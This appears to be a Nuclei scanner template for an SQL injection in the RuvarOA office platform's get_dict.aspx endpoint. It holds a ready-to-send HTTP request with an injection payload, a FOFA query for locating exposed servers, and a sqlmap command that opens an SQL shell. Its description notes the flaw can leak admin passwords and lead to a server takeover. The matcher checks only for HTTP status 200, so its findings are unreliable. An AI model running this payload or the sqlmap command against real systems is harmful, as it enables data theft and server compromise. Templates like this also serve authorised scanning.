id: 2024-105272120

info:
  name: RuvarOA协同办公平台 get_dict SQL注入漏洞
  author: k3ppf0r
  severity: high
  description: |  
    RuvarOA协同办公平台 get_dict SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/138723401
  remediation: |
    升级RuvarOA到高版本
  classification:
    cve-id: 2024-105272120
    cvss-score: 7.8
    cwe-id: CWE-89
  metadata:
    date:  2024-05-11
    version: RuvarOA V6.01 、RuvarOA V12.01
    fofa-query: body="txt_admin_key"
  tags: sqli,RuvarOA,leak

# python sqlmap.py -u "http://xxxx?id=1*" --sql-shell 


http:
  - raw:
      - |
        @timeout: 10s
        GET /include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&bt_name=1&bi_name=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
        Connection: close
 

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
        condition: and

